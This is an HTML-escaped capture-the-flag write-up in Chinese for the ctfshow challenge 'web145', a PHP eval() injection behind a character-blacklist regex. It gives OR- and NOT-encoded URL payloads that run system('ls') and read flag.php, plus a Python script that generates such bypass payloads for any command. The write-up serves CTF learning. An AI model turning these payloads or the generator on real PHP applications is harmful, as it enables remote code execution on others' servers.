&lt;h1 id=&#34;web145&#34;&gt;&lt;a href=&#34;#web145&#34; class=&#34;headerlink&#34; title=&#34;web145&#34;&gt;&lt;/a&gt;web145&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-18 17:41:33

*/


highlight_file(__FILE__);
if(isset($_GET[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v3&amp;#39;]))&amp;#123;
    $v1 = (String)$_GET[&amp;#39;v1&amp;#39;];
    $v2 = (String)$_GET[&amp;#39;v2&amp;#39;];
    $v3 = (String)$_GET[&amp;#39;v3&amp;#39;];
    if(is_numeric($v1) &amp;amp;&amp;amp; is_numeric($v2))&amp;#123;
        if(preg_match(&amp;#39;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&amp;#125;|\%|\&amp;amp;|\;|\&amp;lt;|\&amp;gt;|\*|\/|\^|\#|\&amp;quot;/i&amp;#39;, $v3))&amp;#123;
                die(&amp;#39;get out hacker!&amp;#39;);
        &amp;#125;
        else&amp;#123;
            $code =  eval(&amp;quot;return $v1$v3$v2;&amp;quot;);
            echo &amp;quot;$v1$v3$v2 = &amp;quot;.$code;
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;正则过滤了异或 &lt;code&gt;^&lt;/code&gt; ，可以使用 或 &lt;code&gt;|&lt;/code&gt; ，简单修改脚本即可&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v1=1&amp;amp;v2=1&amp;amp;v3=|(&amp;#39;%13%19%13%14%05%0d&amp;#39;|&amp;#39;%60%60%60%60%60%60&amp;#39;)(&amp;#39;%0c%13&amp;#39;|&amp;#39;%60%60&amp;#39;)|
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817141555070.png&#34; alt=&#34;image-20250817141555070&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817141459477.png&#34; alt=&#34;image-20250817141459477&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v1=1&amp;amp;v2=1&amp;amp;v3=|(&amp;#39;%13%19%13%14%05%0d&amp;#39;|&amp;#39;%60%60%60%60%60%60&amp;#39;)(&amp;#39;%14%01%03%00%06%0c%01%07%02%10%08%10&amp;#39;|&amp;#39;%60%60%60%20%60%60%60%60%2c%60%60%60&amp;#39;)|
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817141632374.png&#34; alt=&#34;image-20250817141632374&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817141311901.png&#34; alt=&#34;image-20250817141311901&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;rce_or.py&lt;/code&gt; 或&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;# rce_or.py
import re

# 预生成 OR 映射表，存入字典
def build_or_table():
    preg = &amp;#39;[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&amp;#125;|\%|\&amp;amp;|\;|\&amp;lt;|\&amp;gt;|\*|\/|\^|\#|\&amp;quot;&amp;#39;
    or_map = &amp;#123;&amp;#125;
    for i in range(256):
        for j in range(256):
            if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):
                k = i | j
                if 32 &amp;lt;= k &amp;lt;= 126:  # 可见字符
                    a = &amp;#39;%&amp;#39; + hex(i)[2:].zfill(2)
                    b = &amp;#39;%&amp;#39; + hex(j)[2:].zfill(2)
                    if chr(k) not in or_map:  # 只存第一次找到的即可
                        or_map[chr(k)] = (a, b)
    return or_map


# 根据输入字符串生成或表达式
def action(arg, or_map):
    s1, s2 = &amp;quot;&amp;quot;, &amp;quot;&amp;quot;
    for ch in arg:
        if ch not in or_map:
            raise ValueError(f&amp;quot;[-] 字符 &amp;#123;ch&amp;#125; 无法生成&amp;quot;)
        a, b = or_map[ch]
        s1 += a
        s2 += b
    return f&amp;quot;(\&amp;#39;&amp;#123;s1&amp;#125;\&amp;#39;|\&amp;#39;&amp;#123;s2&amp;#125;\&amp;#39;)&amp;quot;


def main():
    or_map = build_or_table()
    while True:
        s1 = input(&amp;quot;\n[+] your function：&amp;quot;)
        if s1.lower() == &amp;quot;exit&amp;quot;:
            break
        s2 = input(&amp;quot;[+] your command：&amp;quot;)
        param = action(s1, or_map) + action(s2, or_map)
        print(&amp;#39;\n[*] result:\n&amp;#39; + param)


if __name__ == &amp;quot;__main__&amp;quot;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;取反命令执行&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v1=1&amp;amp;v2=1&amp;amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817142429630.png&#34; alt=&#34;image-20250817142429630&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
